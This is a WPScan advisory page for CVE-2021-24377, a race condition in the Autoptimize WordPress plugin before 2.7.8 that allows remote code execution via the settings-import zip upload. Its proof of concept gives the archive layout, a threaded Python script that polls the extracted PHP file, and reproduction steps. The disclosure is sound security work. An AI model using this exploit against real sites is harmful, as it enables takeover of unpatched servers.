=== Content from wpscan.com_270366ef_20250114_190117.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Autoptimize < 2.7.8 - Race Condition leading to RCE

### Description

The plugin attempts to remove potential malicious files from the extracted archive uploaded via the 'Import Settings' feature, however this is not sufficient to protect against RCE as a race condition can be achieved in between the moment the file is extracted on the disk but not yet removed. It is a bypass of CVE-2020-24948.

### Proof of Concept

To increase the period between extraction of a file and its removal I added another, bigger file to the archive. In fact it was a 4MB list of passwords. This results in having more time between extraction of first (test.php) and second (zzz.txt) files, so that test.php is available for more time.
Exemplary file to use as a second file (zzz.txt) could be for example: https://gitlab.com/kalilinux/packages/seclists/blob/0aab3b70769ed9faf79b3c1159fb32ef131c7ee6/Passwords/xato-net-10-million-passwords-dup.txt
The structure of an archive is as presented:
$ zip -sf upload.zip
Archive contains:
settings.json
test.php
zzz.txt
Total 3 entries (4366552 bytes)
settings.json is an empty file.
Python Script for Race Condition:
#!/usr/bin/python
import requests
from threading import Thread
def requestor(name):
while True:
response = requests.get('http://my\_address\_here/wp/wp-content/uploads/ao\_ccss/test.php')
if 'PHP Version' in response.text:
print(name + " Race condition succeeded.")
# print(response.text)
exit()
threads = []
for i in range(0, 5):
t = Thread(target=requestor, args=("Thread-"+str(i), ))
t.start()
threads.append(t)
for t in threads:
t.join()
Steps to reproduce the vulnerability:
Run the script:
python3 racecondition.php
Upload zip archive using upload here: http://my\_address\_here/wp/wp-admin/options-general.php?page=ao\_critcss
The script should give an output similar to this one:
Thread-4 Race condition succeeded.
In my case, race condition almost always succeed on remote host.

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

autoptimize](https://a8cteam5105.wordpress.com/plugin/autoptimize/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.7.8

### References

CVE
[CVE-2021-24377](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24377)

### Classification

Type
RCE

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-94](https://cwe.mitre.org/data/definitions/94.html)

CVSS
[9.1 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Marcin Węgłowski

Submitter
Marcin Węgłowski

Submitter website
<https://afine.pl>

Submitter twitter
[afinepl](//twitter.com/afinepl)

Verified
Yes

WPVDB ID
[85c0a564-2e56-413d-bc3a-1039343207e4](https://a8cteam5105.wordpress.com/vulnerability/85c0a564-2e56-413d-bc3a-1039343207e4/)

### Timeline

Publicly Published
2020-10-09 (about 4 years ago)

Added
2021-06-07 (about 3 years ago)

Last Updated
2021-06-25 (about 3 years ago)

### Other

Published
Title

Published
2023-09-26
Title
[Ni Purchase Order(PO) For WooCommerce < 1.2.2 - Admin+ File Upload to Remote Code Execution](https://a8cteam5105.wordpress.com/vulnerability/70f823ff-64ad-4f05-9eb3-b69b3b79dc12/)

Published
2014-08-01
Title
[Is-human <= 1.4.2 - Remote Comm& Execution](https://a8cteam5105.wordpress.com/vulnerability/36992709-b2ea-4491-b7b4-fe47b673feb9/)

Published
2021-05-25
Title
[SP Project & Document Manager < 4.22 - Authenticated Shell Upload](https://a8cteam5105.wordpress.com/vulnerability/8f6e82d5-c0e9-468e-acb8-7cd549f6a45a/)

Published
2014-08-01
Title
[PHP Shell Plugin](https://a8cteam5105.wordpress.com/vulnerability/c895ffab-83aa-4207-99c5-7bb3f86917bc/)

Published
2024-06-19
Title
[Custom Field Suite <= 2.6.7 - Contributor+ PHP Code Injection via Loop Custom Field](https://a8cteam5105.wordpress.com/vulnerability/4108bdcf-b163-4159-a0e7-111accf898cf/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

